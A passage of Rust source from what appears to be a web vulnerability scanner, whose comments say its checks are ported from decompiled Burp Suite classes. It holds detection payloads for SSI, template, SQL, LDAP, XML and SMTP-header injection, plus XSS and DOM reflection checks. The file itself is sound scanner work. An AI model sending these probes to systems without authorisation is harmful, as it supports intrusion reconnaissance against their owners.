    let (id1, v1) = (ssi_shift(token, 14, 10), ssi_shift(token, 13, 10));
    let (id2, v2) = (ssi_shift(token, 16, 10), ssi_shift(token, 15, 10));
    let payload = format!(
        "<!--#set var=\"{id1}\" value=\"{v1}\"--><!--#set var=\"{id2}\" value=\"{v2}\"--><!--#echo var=\"{id1}\"--><!--#echo var=\"{id2}\"-->"
    );
    (payload, format!("{v1}{v2}"))
}

pub(crate) struct SsiHit {
    pub payload: String,
}

/// burp.Zexx echo-based SSI: a server that processes SSI emits value1value2
/// as bare text, which the reflected payload never shows contiguously.
pub(crate) fn run_ssi_check<F: FnMut(&str) -> Option<String>>(value: &str, mut send: F) -> Option<SsiHit> {
    let token: String = {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..10).map(|_| SSI_ALPHABET[g.gen_range(0..26)] as char).collect()
    };
    let (payload, expected) = ssi_payload(&token);
    let body = send(&format!("{value}{payload}"))?;
    if body.contains(&payload) {
        return None;
    }
    body.contains(&expected).then_some(SsiHit { payload })
}
// ================= Server-side template / code injection (burp.Zi6p.Znq) =================

/// A template-injection probe ported from one burp.Znq echo-based detector:
/// `make` builds `<prefix>EXPR<suffix>`, `expected` is the string a vulnerable
/// engine renders between the same prefix and suffix. The literal payload is
/// never equal to `expected` (comment-split or arithmetic), so a plain echo
/// does not match. burp.Ziog(payload, expected).
pub(crate) struct SstiProbe {
    pub engine: &'static str,
    pub payload: String,
    pub expected: Vec<String>,
}

/// burp.Znq echo-based detectors (Zsl3, Zhuy, Zieh, Zgok, Zpk0, Zbrp, Ziyq,
/// Zxpo arithmetic; Zp1w, Zpjg, Zi1a identity). Random prefix/suffix and
/// factors per Zg_o.ZP/Zu, so a literal reflection cannot collide.
pub(crate) fn ssti_probes(prefix: &str, suffix: &str) -> Vec<SstiProbe> {
    use rand::Rng;
    let mut g = rand::thread_rng();
    let n = |g: &mut rand::rngs::ThreadRng| g.gen_range(100..1000);
    let (a, b, c, d) = (n(&mut g), n(&mut g), n(&mut g), n(&mut g));
    let p = |engine: &'static str, payload: String, expected: Vec<String>| SstiProbe { engine, payload, expected };
    vec![
        p("Freemarker/EL ${}", format!("{prefix}${{{a}*{b}}}{suffix}"), vec![format!("{prefix}{}{suffix}", a * b)]),
        p("Jinja/Twig {{}}", format!("{prefix}{{{{{a}*{b}}}}}{suffix}"), vec![format!("{prefix}{}{suffix}", a * b)]),
        p("Spring/Thymeleaf #{}", format!("{prefix}#{{{a}*{b}}}{suffix}"), vec![format!("{prefix}{}{suffix}", a * b)]),
        p("Struts/OGNL %{}", format!("{prefix}%{{{a}*{b}}}{suffix}"), vec![format!("{prefix}{}{suffix}", a * b)]),
        p("Angular/other [[]]", format!("{prefix}[[{a}*{b}]]{suffix}"), vec![format!("{prefix}{}{suffix}", a * b)]),
        p(
            "Smarty {}",
            format!("{prefix}{{{a}*{b}}}{{*commentedout*}}{{{c}*{d}}}{suffix}"),
            vec![format!("{prefix}{}{}{suffix}", a * b, c * d)],
        ),
        p(
            "Twig {{*'*'}}",
            format!("{prefix}{{{{{a}*'{b}'}}}}{{#commentedout#}}{{{{{c}*{d}}}}}{suffix}"),
            vec![format!("{prefix}{}{suffix}", c * d), format!("{prefix}{}{}{suffix}", a * b, c * d)],
        ),
        p("EL ${''.class}", format!("{prefix}${{''.class}}{suffix}"), vec![format!("{prefix}class java.lang.String{suffix}")]),
        p("EL ${os.arch}", format!("{prefix}${{os.arch}}{suffix}"), vec![format!("{prefix}amd64{suffix}"), format!("{prefix}x86_64{suffix}")]),
        p("EL ${file.separator}", format!("{prefix}${{file.separator}}{suffix}"), vec![format!("{prefix}/{suffix}"), format!("{prefix}\\{suffix}")]),
    ]
}

pub(crate) struct SstiHit {
    pub engine: &'static str,
    pub payload: String,
}

/// burp.Zi6p echo-based template/code injection: for each detector, send
/// `<prefix>EXPR<suffix>` and report when the rendered `expected` appears in
/// the response while the raw payload does not (so a literal echo is rejected).
pub(crate) fn run_ssti_check<F: FnMut(&str) -> Option<String>>(value: &str, mut send: F) -> Option<SstiHit> {
    use rand::Rng;
    let mut g = rand::thread_rng();
    let rnd = |g: &mut rand::rngs::ThreadRng| (0..5).map(|_| (b'a' + g.gen_range(0..26)) as char).collect::<String>();
    let (prefix, suffix) = (rnd(&mut g), rnd(&mut g));
    for probe in ssti_probes(&prefix, &suffix) {
        let Some(body) = send(&format!("{value}{}", probe.payload)) else { continue };
        if body.contains(&probe.payload) {
            continue; // literal echo, not evaluation
        }
        if probe.expected.iter().any(|e| body.contains(e)) {
            return Some(SstiHit { engine: probe.engine, payload: probe.payload });
        }
    }
    None
}
// ================= Error-based SQL injection (burp.Zppj.ZE) =================

/// burp.Ze2s.Zn: SQL error signatures per database, decoded at runtime from
/// Burp's own class. Index 0 is the generic `SQLException`.
pub(crate) const SQL_ERRORS: [(&str, &[&str]); 8] = [
    ("Generic", &["SQLException"]),
    ("Microsoft SQL Server", &["Incorrect syntax near", "Unclosed quotation mark", ", which was not supplied", "Invalid object name", "Microsoft OLE DB Provider", "ODBC SQL Server Driver", "Column name or number of supplied values does not match table definition", "Cannot find column", "SqlException"]),
    ("Oracle", &["ODBC driver for Oracle", "quoted string not properly terminated", "missing right parenthesis", "PLS-0", "ORA-0", "ORA-1", "ORA-2", "ORA-3", "ORA-4"]),
    ("MySQL", &["You have an error in your SQL syntax", "Incorrect column name", "Can't find record in", "Unknown table", "Incorrect column specifier for column", "Column count doesn't match value count at row", "supplied argument is not a valid MySQL result", "MDB2 Error: syntax error"]),
    ("PostgreSQL", &["unterminated quoted identifier", "unterminated quoted string", "unterminated string literal", "Query failed: ERROR: syntax error", "PostgreSQL"]),
    ("Microsoft Access", &["ODBC Microsoft Access Driver", "Syntax error in string in query expression"]),
    ("IBM DB2", &["CLI Driver", "does not have an ending string delimiter", "Expected tokens may include:  ", "Escape syntax error.  See attached Throwable for details."]),
    ("ColdFusion", &["Dynamic Page Generation Error"]),
];

/// The first database error signature in `body` that the baseline lacks.
pub(crate) fn sql_error_in(body: &str, baseline: &str) -> Option<(usize, &'static str)> {
    for (i, (_, sigs)) in SQL_ERRORS.iter().enumerate() {
        if let Some(sig) = sigs.iter().find(|s| body.contains(**s) && !baseline.contains(**s)) {
            return Some((i, sig));
        }
    }
    None
}

pub(crate) struct SqlErrorHit {
    pub database: &'static str,
    pub payload: String,
    pub confirmed: bool,
}

/// burp.Zppj.ZE with the quote series decoded through Burp's own string
/// decoder (Zppj.a): one to four single quotes, and at THOROUGH
/// (MYSQL_SPECIFIC) the backslash-escaped quotes `\'` `\\'` `\\\'` `\\\\'`.
/// Payloads are appended to the value. A database-specific error on the
/// first probe reports (confirmed when the balanced second probe is clean);
/// the generic SQLException needs the full alternation error, clean, error,
/// clean. Mapping Burp's issue flags 16/8 to specific/generic is inferred.
pub(crate) fn run_sql_error_check<F: FnMut(&str) -> Option<String>>(
    value: &str,
    baseline: &str,
    speed: ScanSpeed,
    mut send: F,
) -> Option<SqlErrorHit> {
    let (base_status, base_body) = split_resp(baseline);
    let mut series: Vec<[&str; 4]> = vec![["'", "''", "'''", "''''"]];
    if speed >= ScanSpeed::Thorough {
        series.push([r"\'", r"\\'", r"\\\'", r"\\\\'"]);
    }
    for s in series {
        // (database index, signature), database usize::MAX = Burp's "general
        // error" (burp.Zbpt via Zxp6, issue flag 8 -> description flag 64).
        let mut probe = |suffix: &str| {
            send(&format!("{value}{suffix}")).and_then(|raw| {
                let (st, body) = split_resp(&raw);
                sql_error_in(body, base_body)
                    .or_else(|| generic_error_in(st, body, base_status, base_body).map(|w| (usize::MAX, w)))
            })
        };
        let Some((db, _)) = probe(s[0]) else { continue };
        let second_clean = probe(s[1]).is_none();
        let hit = |confirmed| SqlErrorHit {
            database: if db == usize::MAX { "General" } else { SQL_ERRORS[db].0 },
            payload: format!("{value}{}", s[0]),
            confirmed,
        };
        if db != 0 && db != usize::MAX {
            return Some(hit(second_clean));
        }
        if second_clean && probe(s[2]).is_some() && probe(s[3]).is_none() {
            return Some(hit(true));
        }
    }
    None
}

/// (status, body) of a raw response; a bare body string counts as a 200.
fn split_resp(raw: &str) -> (u16, &str) {
    if raw.starts_with("HTTP/") {
        let status = raw.split_whitespace().nth(1).and_then(|x| x.parse().ok()).unwrap_or(0);
        let body = raw.find("\r\n\r\n").map(|i| &raw[i + 4..]).or_else(|| raw.find("\n\n").map(|i| &raw[i + 2..])).unwrap_or("");
        (status, body)
    } else {
        (200, raw)
    }
}

/// burp.Ze27.Za, runtime-dumped: the "general error" words (case-insensitive).
pub(crate) const GENERIC_ERROR_WORDS: [&str; 6] = ["error", "exception", "illegal", "invalid", "fail", "stack"];

/// burp.Zbpt.ZJ: a new 5xx status, or a general error word the baseline
/// response did not contain.
pub(crate) fn generic_error_in(status: u16, body: &str, base_status: u16, base_body: &str) -> Option<&'static str> {
    // Without a baseline response there is nothing to compare against.
    if base_status == 0 && base_body.is_empty() {
        return None;
    }
    if (500..600).contains(&status) && !(500..600).contains(&base_status) {
        return Some("HTTP 5xx");
    }
    let low = body.to_ascii_lowercase();
    let base = base_body.to_ascii_lowercase();
    GENERIC_ERROR_WORDS.iter().copied().find(|w| low.contains(w) && !base.contains(w))
}

// ================= Boolean SQL injection (burp.Zppj) =================

/// burp.Zguq subclasses: the boolean payload shapes.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum SqlBoolShape {
    /// burp.Zguz: `<r>{q} or {q}{n}{q}={q}{v}`
    Or,
    /// burp.Zgut: `<r>{q} or {n}={v}-- `
    OrComment,
    /// burp.Zgua: `{q} and {q}{n}{q}={q}{v}`
    And,
    /// burp.Zgu3: `{q} and {n}={v}-- `
    AndComment,
}

/// burp.Zguq: positive/negative payload generator for one shape and quote.
pub(crate) struct SqlBoolGen {
    shape: SqlBoolShape,
    quote: String,
    pos: usize,
    neg: usize,
}

impl SqlBoolGen {
    pub(crate) fn new(shape: SqlBoolShape, quote: &str) -> Self {
        SqlBoolGen { shape, quote: quote.to_string(), pos: 0, neg: 0 }
    }
    fn render(&self, r: u32, n: u32, v: &str) -> String {
        let q = &self.quote;
        match self.shape {
            SqlBoolShape::Or => format!("{r}{q} or {q}{n}{q}={q}{v}"),
            SqlBoolShape::OrComment => format!("{r}{q} or {n}={v}-- "),
            SqlBoolShape::And => format!("{q} and {q}{n}{q}={q}{v}"),
            SqlBoolShape::AndComment => format!("{q} and {n}={v}-- "),
        }
    }
    /// Zguq.ZS: n in [1000,10000) compared with itself; unquoted, every
    /// fourth (starting with the first) compares with "0n" (still equal).
    pub(crate) fn positive_with(&mut self, r: u32, n: u32) -> String {
        let quoted = !self.quote.is_empty();
        let v = if !quoted && self.pos % 4 == 0 { format!("0{n}") } else { n.to_string() };
        self.pos += 1;
        self.render(r, n, &v)
    }
    /// Zguq.ZN: m in [1009,9990) compared with m+k (k in [1,10)); every
    /// fourth (the second, sixth, ...) with m+quote (quoted) or m+"0".
    pub(crate) fn negative_with(&mut self, r: u32, m: u32, k: u32) -> String {
        let v = if self.neg % 4 == 1 {
            if self.quote.is_empty() { format!("{m}0") } else { format!("{m}{}", self.quote) }
        } else {
            (m + k).to_string()
        };
        self.neg += 1;
        self.render(r, m, &v)
    }
    pub(crate) fn positive(&mut self) -> String {
        use rand::Rng;
        let mut g = rand::thread_rng();
        let (r, n) = (g.gen_range(10_000_000..100_000_000), g.gen_range(1000..10000));
        self.positive_with(r, n)
    }
    pub(crate) fn negative(&mut self) -> String {
        use rand::Rng;
        let mut g = rand::thread_rng();
        let (r, m, k) = (g.gen_range(10_000_000..100_000_000), g.gen_range(1009..9990), g.gen_range(1..10));
        self.negative_with(r, m, k)
    }
}

pub(crate) struct SqlBoolHit {
    pub positive: String,
    pub negative: String,
    pub attributes: Vec<crate::variations::Attr>,
}

/// burp.Zppj.Zi -> ZL(""), ZL("'"), then the numeric pairs (Zppj.Zh).
/// String pairs are appended to the value (Zx4k mode 1); numeric pairs
/// replace it (mode 0). Each attempt runs Burp's differential engine.
/// The unquoted attempt is gated on Burp's insertion-point predicate
/// (Zgx0.ZO()/Zs(), not decompilable here); WebProbe uses "value is
/// numeric" for it (inferred).
pub(crate) fn run_sql_boolean_check<F: FnMut(&str) -> Option<Vec<u8>>>(
    value: &str,
    baseline: &[u8],
    speed: ScanSpeed,
    accuracy: crate::variations::Accuracy,
    mut send: F,
) -> Option<SqlBoolHit> {
    let numeric = !value.is_empty() && value.chars().all(|c| c.is_ascii_digit());
    let mut quotes: Vec<&str> = Vec::new();
    if numeric {
        quotes.push("");
    }
    quotes.push("'");
    let mut shapes = vec![SqlBoolShape::Or, SqlBoolShape::OrComment];
    if speed >= ScanSpeed::Normal {
        shapes.extend([SqlBoolShape::And, SqlBoolShape::AndComment]);
    }
    let sent = std::cell::RefCell::new(&mut send);
    for q in quotes {
        for shape in &shapes {
            let gen = std::cell::RefCell::new(SqlBoolGen::new(*shape, q));
            let (fp, fnn) = (std::cell::RefCell::new(None::<String>), std::cell::RefCell::new(None::<String>));
            let attrs = crate::variations::differential(
                Some(baseline),
                accuracy,
                || {
                    let p = format!("{value}{}", gen.borrow_mut().positive());
                    fp.borrow_mut().get_or_insert_with(|| p.clone());
                    (sent.borrow_mut())(&p)
                },
                || {
                    let p = format!("{value}{}", gen.borrow_mut().negative());
                    fnn.borrow_mut().get_or_insert_with(|| p.clone());
                    (sent.borrow_mut())(&p)
                },
            );
            if let Some(attributes) = attrs {
                return Some(SqlBoolHit {
                    positive: fp.into_inner().unwrap_or_default(),
                    negative: fnn.into_inner().unwrap_or_default(),
                    attributes,
                });
            }
        }
    }
    // burp.Zppj.Zh: numeric pairs replacing the value (Zht3 cycles the lists).
    if speed >= ScanSpeed::Normal {
        const T: [&str; 4] = ["(select abs(1))", "(select 1)", "1", "000001"];
        const F: [&str; 4] = ["(select sba(1))", "(seletc 1)", "0", "100000"];
        let (ip, ineg) = (std::cell::Cell::new(0usize), std::cell::Cell::new(0usize));
        let attrs = crate::variations::differential(
            Some(baseline),
            accuracy,
            || {
                let p = T[ip.get() % 4];
                ip.set(ip.get() + 1);
                (sent.borrow_mut())(p)
            },
            || {
                let p = F[ineg.get() % 4];
                ineg.set(ineg.get() + 1);
                (sent.borrow_mut())(p)
            },
        );
        if let Some(attributes) = attrs {
            return Some(SqlBoolHit { positive: T[0].into(), negative: F[0].into(), attributes });
        }
    }
    None
}

// ================= LDAP injection (burp.Zwkf) =================

/// burp.Zwkf.ZM/ZR: not for boolean literals, and only when every char after
/// the first is a letter, digit, space or one of `'"@.-*`.
pub(crate) fn ldap_applicable(value: &str) -> bool {
    if value.eq_ignore_ascii_case("true") || value.eq_ignore_ascii_case("false") {
        return false;
    }
    value.chars().skip(1).all(|c| c.is_alphanumeric() || " '\"@.-*".contains(c))
}

/// burp.Zsna.ZI: `<prefix>)(<filter>` where the filter is objectClass=*
/// wrapped in `k % 6` negations. Even k always matches (positive), odd k
/// never matches (negative); Burp walks k = 0,2,4,.. and 1,3,5,..
pub(crate) fn ldap_payload(prefix: &str, k: usize) -> String {
    let mut f = "objectClass=*".to_string();
    for _ in 0..k % 6 {
        f = format!("!({f})");
    }
    format!("{prefix})({f}")
}

pub(crate) struct LdapHit {
    pub positive: String,
    pub negative: String,
    pub attributes: Vec<crate::variations::Attr>,
}

/// burp.Zwkf.Zq: at NORMAL speed or above the random-prefix payloads are
/// tried first (Zsna.ZJ, 10 random chars per payload), then the wildcard
/// prefix `*` (Zsna.Zz). Each runs Burp's differential engine (Zmaq) against
/// the base response; payloads replace the value (Ziqd mode 0).
// ================= XML injection (burp.Zp7s, error-based) =================

/// burp.Zp7s.Zq: appended to the value (insertion mode 1, base + payload).
pub(crate) const XML_INJECTION_PAYLOAD: &str = "]]>><";

/// burp.Zp7s.ZJ, read back from its compiled byte tries (case-insensitive):
/// XML / SOAP markers whose appearance signals the payload reached an XML
/// document the application builds.
const XML_INJECTION_MARKERS: [&str; 14] = [
    "xml.", "xml&nbsp;", "xmlschema", "xmlsoap", "xmlns:soap", "xmlns:xsd", "xmlns:xsi",
    "soap ", "soap.", "soap:", "soapenv", "soap-env", "soap:env", "soap:body",
];

/// burp.Zp7s.Zq: repetitions by audit accuracy (1, 2 or 3).
pub(crate) fn xml_injection_rounds(a: crate::variations::Accuracy) -> usize {
    match a {
        crate::variations::Accuracy::MinimizeFalseNegatives => 1,
        crate::variations::Accuracy::Normal => 2,
        crate::variations::Accuracy::MinimizeFalsePositives => 3,
    }
}

/// The markers present in a response body, ignoring any that sit inside an
/// ASP.NET __VIEWSTATE value (burp.Zw4k.ZI).
fn xml_markers_in(resp: &[u8]) -> Vec<&'static str> {
    let p = util::parse_http(resp);
    let body = String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]).to_ascii_lowercase();
    let viewstate: Vec<(usize, usize)> = {
        let mut v = Vec::new();
        let mut from = 0;
        while let Some(i) = body[from..].find("__viewstate") {
            let at = from + i;
            if let Some(vs) = body[at..].find("value=\"") {
                let start = at + vs + 7;
                let end = body[start..].find('"').map(|e| start + e).unwrap_or(body.len());
                v.push((start, end));
            }
            from = at + 11;
        }
        v
    };
    XML_INJECTION_MARKERS
        .iter()
        .copied()
        .filter(|m| {
            let mut from = 0;
            while let Some(i) = body[from..].find(m) {
                let at = from + i;
                if !viewstate.iter().any(|(s, e)| at >= *s && at < *e) {
                    return true;
                }
                from = at + 1;
            }
            false
        })
        .collect()
}

/// burp.Zp7s.ZT: applies when the value holds no '<' or '>' (Zp7s.ZQ). Each
/// round appends the payload and keeps only the markers the round's baseline
/// (the original response first, then a fresh one) did not already show; the
/// issue needs new markers in every round.
pub(crate) fn run_xml_injection_check<P, B>(value: &str, baseline: &[u8], rounds: usize, mut send_payload: P, mut send_base: B) -> Option<Vec<&'static str>>
where
    P: FnMut(&str) -> Option<Vec<u8>>,
    B: FnMut() -> Option<Vec<u8>>,
{
    if value.contains(['<', '>']) {
        return None;
    }
    let payload = format!("{value}{XML_INJECTION_PAYLOAD}");
    let mut last = Vec::new();
    for round in 0..rounds.max(1) {
        let base = if round == 0 { baseline.to_vec() } else { send_base()? };
        let before = xml_markers_in(&base);
        let attack = send_payload(&payload)?;
        let new: Vec<&'static str> = xml_markers_in(&attack).into_iter().filter(|m| !before.contains(m)).collect();
        if new.is_empty() {
            return None;
        }
        last = new;
    }
    Some(last)
}

pub(crate) fn run_ldap_check<F: FnMut(&str) -> Option<Vec<u8>>>(
    value: &str,
    baseline: &[u8],
    speed: ScanSpeed,
    accuracy: crate::variations::Accuracy,
    mut send: F,
) -> Option<LdapHit> {
    if !ldap_applicable(value) {
        return None;
    }
    let random = || {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        (0..10).map(|_| (b'a' + rng.gen_range(0..26)) as char).collect::<String>()
    };
    let variants: Vec<bool> = if speed >= ScanSpeed::Normal { vec![true, false] } else { vec![false] };
    for random_prefix in variants {
        let prefix = |r: &dyn Fn() -> String| if random_prefix { r() } else { "*".to_string() };
        let (mut kp, mut kn) = (0usize, 1usize);
        let (mut first_p, mut first_n) = (None, None);
        let sent = std::cell::RefCell::new(&mut send);
        let attrs = crate::variations::differential(
            Some(baseline),
            accuracy,
            || {
                let p = ldap_payload(&prefix(&random), kp);
                kp += 2;
                first_p.get_or_insert_with(|| p.clone());
                (sent.borrow_mut())(&p)
            },
            || {
                let p = ldap_payload(&prefix(&random), kn);
                kn += 2;
                first_n.get_or_insert_with(|| p.clone());
                (sent.borrow_mut())(&p)
            },
        );
        if let Some(attributes) = attrs {
            return Some(LdapHit { positive: first_p.unwrap_or_default(), negative: first_n.unwrap_or_default(), attributes });
        }
    }
    None
}

/// True when the response echoes the injected header marker in its body or
/// in any response header. Burp family:
/// SCANNER_ACTIVE_CHECKS_HEADER_MANIPULATION.
fn is_header_manipulation_hit(body: &str, headers: &[(String, String)], marker: &str) -> bool {
    body.contains(marker) || headers.iter().any(|(_, v)| v.contains(marker))
}


/// Collaborator ids for Burp's SMTP header injection check on one
/// parameter: `simple` and `enclosed` (burp.Zrok, Zpu2
/// SMTP_HEADER_INJECTION_SIMPLE_PAYLOAD / _ENCLOSED_PAYLOAD), each with the
/// public host its id lives under.
#[derive(Clone, Debug)]
pub struct SmtpOob {
    pub param: String,
    pub simple: (String, String),
    pub enclosed: (String, String),
}

/// burp.Zrok.Zl: `String.format("%s\r\nBCC:%s\r\n%s: %s", enclosed ? ">" : "",
/// address, rand(3), rand(1))`, appended to the base value (Ziqd mode 1).
/// The address uses burp.Zbzl.Zm's `user@<id>.<domain>` form: a live test
/// against interactsh showed only that form is attributed to the id.
pub(crate) fn smtp_payload(value: &str, enclosed: bool, host: &str, r3: &str, r1: &str) -> String {
    format!("{value}{}\r\nBCC:user@{host}\r\n{r3}: {r1}", if enclosed { ">" } else { "" })
}

/// TRACE probe: a 2xx response that echoes the request line and headers back
/// means the TRACE method is enabled (cross-site tracing). Burp family:
/// SCANNER_ACTIVE_CHECKS_SERVER_LEVEL_ISSUES.
fn is_trace_hit(status: &str, body: &str, path: &str) -> bool {
    status.starts_with('2') && body.contains(&format!("TRACE {path}")) && body.contains("Host:")
}

/// OPTIONS probe: which risky methods does the Allow header admit? Empty
/// unless the status is 2xx. Burp family:
/// SCANNER_ACTIVE_CHECKS_SERVER_LEVEL_ISSUES.
fn risky_methods_allowed(status: &str, allow: Option<&str>) -> Vec<String> {
    if !status.starts_with('2') {
        return Vec::new();
    }
    allow
        .map(|a| {
            a.split(',')
                .map(|m| m.trim().to_ascii_uppercase())
                .filter(|m| matches!(m.as_str(), "PUT" | "DELETE" | "TRACE" | "CONNECT"))
                .collect()
        })
        .unwrap_or_default()
}

/// Classify a later response that may contain an earlier probe's marker:
/// "xss" when the script-tag payload was persisted, "dom" when the canary
/// now sits in script data or an attribute value, "input" for any other
/// unencoded echo. Burp families: SCANNER_ACTIVE_CHECKS_STORED_XSS /
/// STORED_DOM / STORED_INPUT.
fn stored_echo_hit(body: &str, marker: &str) -> Option<&'static str> {
    if body.contains(&format!("<script>{marker}</script>")) {
        Some("xss")
    } else if is_reflected_dom_hit(body, marker) {
        Some("dom")
    } else if body.contains(marker) {
        Some("input")
    } else {
        None
    }
}

/// Reflected DOM (burp.Zbjf SCANNER_ACTIVE_CHECKS_REFLECTED_DOM): a plain
/// canary is reflected unencoded into script data (between <script> and
/// </script>) or into a quoted attribute value inside a tag — the contexts
/// the client DOM parser hands to sinks. A bare text-node reflection does
/// not count, and HTML-escaped reflections never match.
fn is_reflected_dom_hit(body: &str, canary: &str) -> bool {
    if !body.contains(canary) {
        return false;
    }
    let lower = body.to_ascii_lowercase();
    // script data: every <script ...> ... </script> region
    let mut start = 0;
    while let Some(open) = lower[start..].find("<script") {
        let s = start + open;
        let Some(close) = lower[s..].find("</script") else { break };
        if body[s..s + close].contains(canary) {
            return true;
        }
        start = s + close;
    }
    // attribute value: the canary sits inside a quoted value within a tag
    for (pos, _) in body.match_indices(canary) {
        let tag_open = body[..pos].rfind('<').map(|i| i + 1).unwrap_or(0);
        if let Some(tag_close) = body[pos..].find('>') {
            let tag = &body[tag_open..pos + tag_close];
            let inside = |q: char| {
                let first = tag.find(q).map(|i| i + tag_open).unwrap_or(0);
                let last = tag.rfind(q).map(|i| i + tag_open).unwrap_or(0);
                last > first + 1 && first < pos && pos + canary.len() <= last
            };
            if inside('"') || inside('\'') {
                return true;
            }
        }
    }
    false
}

/// Burp's URL path insertion points: ("URL path folder N", index, value) for
/// each folder and ("URL path filename", index, value) for a non-empty last
/// segment. Indices count the '/'-separated segments after the leading '/';
/// N counts only non-empty segments, like burp.Zhjs.ZK (`++var4` per
/// non-empty segment, so `//a/b` gives folder 1 = "a").
pub(crate) fn path_insertion_points(path: &str) -> Vec<(String, usize, String)> {
    let p = path.split('?').next().unwrap_or("");
    let p = match p.split_once("://") {
        Some((_, rest)) => rest.find('/').map(|i| &rest[i..]).unwrap_or("/"),
        None => p,
    };
    let segs: Vec<&str> = p.trim_start_matches('/').split('/').collect();
    let mut out = Vec::new();
    let n = segs.len();
    let mut ordinal = 0;
    for (i, seg) in segs.iter().enumerate() {
        if seg.is_empty() {
            continue;
        }
        ordinal += 1;
        if i + 1 == n {
            out.push(("URL path filename".to_string(), i, seg.to_string()));
        } else {
            out.push((format!("URL path folder {ordinal}"), i, seg.to_string()));
        }
    }
    out
}

/// `path` with segment `idx` replaced by `value` (query string kept).
pub(crate) fn with_path_segment(path: &str, idx: usize, value: &str) -> String {
    let (p, q) = match path.split_once('?') {
        Some((p, q)) => (p, Some(q)),
        None => (path, None),
    };
    let mut segs: Vec<String> = p.trim_start_matches('/').split('/').map(str::to_string).collect();
    if let Some(s) = segs.get_mut(idx) {
        *s = encode_query_payload(value).replace('/', "%2F").replace('?', "%3F");
    }
    let joined = format!("/{}", segs.join("/"));
    match q {
        Some(q) => format!("{joined}?{q}"),
        None => joined,
    }
}


/// Every audit check as (id, issue it reports, true for per-point checks),
/// in run order, for the scan configuration's check list.
pub fn check_catalogue() -> Vec<(&'static str, &'static str, bool)> {
    let mut v: Vec<(&'static str, &'static str, bool)> = checks::POINT_CHECKS.iter().map(|c| (c.id(), c.issue(), true)).collect();
    v.extend(checks::REQUEST_CHECKS.iter().map(|c| (c.id(), c.issue(), false)));
    v
}

/// The multipart boundary of a `multipart/form-data` Content-Type.
fn multipart_boundary(ct: &str) -> Option<String> {
    if !ct.to_ascii_lowercase().contains("multipart/") {
        return None;
    }
    let i = ct.to_ascii_lowercase().find("boundary=")?;
    let b = ct[i + 9..].split(';').next().unwrap_or("").trim().trim_matches('"');
    (!b.is_empty()).then(|| b.to_string())
}

/// One part of a multipart body: byte ranges into the body string.
#[derive(Clone, Debug)]
pub(crate) struct MultipartPart {
    pub name: String,
    pub filename: Option<String>,
    /// Range of the part's header block (Content-Disposition, Content-Type).
    pub head: (usize, usize),
    /// Range of the part's content (without the CRLF before the next boundary).
    pub content: (usize, usize),
}

fn disposition_attr(head: &str, attr: &str) -> Option<String> {
    let low = head.to_ascii_lowercase();
    let mut from = 0;
    while let Some(i) = low[from..].find(attr) {
        let at = from + i;
        let before_ok = at == 0 || matches!(low.as_bytes()[at - 1], b' ' | b';' | b'\t');
        let rest = &head[at + attr.len()..];
        if before_ok && rest.starts_with("=\"") {
            let v = &rest[2..];
            return Some(v[..v.find('"').unwrap_or(v.len())].to_string());
        }
        from = at + attr.len();
    }
    None
}

/// The parts of a multipart body, in order.
pub(crate) fn multipart_parts(body: &str, boundary: &str) -> Vec<MultipartPart> {
    let delim = format!("--{boundary}");
    let mut out = Vec::new();
    let mut pos = match body.find(&delim) {
        Some(i) => i + delim.len(),
        None => return out,
    };
    loop {
        if body[pos..].starts_with("--") {
            break; // closing delimiter
        }
        let head_start = match body[pos..].find("\r\n") {
            Some(i) => pos + i + 2,
            None => break,
        };
        let Some(head_len) = body[head_start..].find("\r\n\r\n") else { break };
        let head_end = head_start + head_len;
        let content_start = head_end + 4;
        let Some(next) = body[content_start..].find(&delim) else { break };
        let next = content_start + next;
        let content_end = if body[..next].ends_with("\r\n") { next - 2 } else { next };
        let head = &body[head_start..head_end];
        out.push(MultipartPart {
            name: disposition_attr(head, "name").unwrap_or_default(),
            filename: disposition_attr(head, "filename"),
            head: (head_start, head_end),
            content: (content_start, content_end.max(content_start)),
        });
        pos = next + delim.len();
    }
    out
}

/// The request with multipart part `index` rewritten: new content and, for a
/// file-upload part, optionally a new filename and part Content-Type (the
/// three fields burp.Ziqg.ZL replaces). Content-Length is restamped.
pub(crate) fn with_multipart_part(req: &str, index: usize, content: &str, filename: Option<&str>, part_ct: Option<&str>) -> String {
    let parts = util::parse_http(req.as_bytes());
    let ct = util::get_header(&parts.headers, "Content-Type").unwrap_or_default();
    let Some(boundary) = multipart_boundary(&ct) else { return req.to_string() };
    let body = req.find("\r\n\r\n").map(|i| &req[i + 4..]).unwrap_or("");
    let Some(p) = multipart_parts(body, &boundary).into_iter().nth(index) else { return req.to_string() };
    let mut head = body[p.head.0..p.head.1].to_string();
    if let (Some(new), Some(old)) = (filename, p.filename.as_deref()) {
        head = head.replacen(&format!("filename=\"{old}\""), &format!("filename=\"{new}\""), 1);
    }
    if let Some(new_ct) = part_ct {
        let lines: Vec<String> = head
            .split("\r\n")
            .map(|l| if l.to_ascii_lowercase().starts_with("content-type:") { format!("Content-Type: {new_ct}") } else { l.to_string() })
            .collect();
        head = lines.join("\r\n");
        if !head.to_ascii_lowercase().contains("content-type:") {
            head.push_str(&format!("\r\nContent-Type: {new_ct}"));
        }
    }
    let new_body = format!("{}{}\r\n\r\n{}{}", &body[..p.head.0], head, content, &body[p.content.1..]);
    with_body(req, &new_body)
}

/// One request to the scan target, plain or TLS.
fn send_one(shared: &Arc<Shared>, https: bool, host: &str, port: u16, raw: &[u8]) -> Option<Vec<u8>> {
    crate::tasks::wait_while_paused(shared);
    let up = if https { net::send_tls_raw(shared, host, port, raw) } else { net::send_raw(shared, host, port, raw) };
    up.resp
}

/// The origin-form path of `url` when it points at the scanned origin:
/// absolute same-origin URLs, root-relative paths, and paths relative to
/// the directory of `base_path`. Other origins give None (no traffic leaves
/// the audited host).
pub(crate) fn same_origin_path(url: &str, https: bool, host_header: &str, base_path: &str) -> Option<String> {
    let url = url.trim();
    if url.is_empty() || url.starts_with('#') {
        return None;
    }
    let scheme = if https { "https" } else { "http" };
    if let Some(rest) = url.strip_prefix("//").or_else(|| url.split_once("://").filter(|(s, _)| s.eq_ignore_ascii_case(scheme)).map(|(_, r)| r)) {
        let (authority, path) = rest.find('/').map(|i| (&rest[..i], &rest[i..])).unwrap_or((rest, "/"));
        return authority.eq_ignore_ascii_case(host_header).then(|| path.to_string());
    }
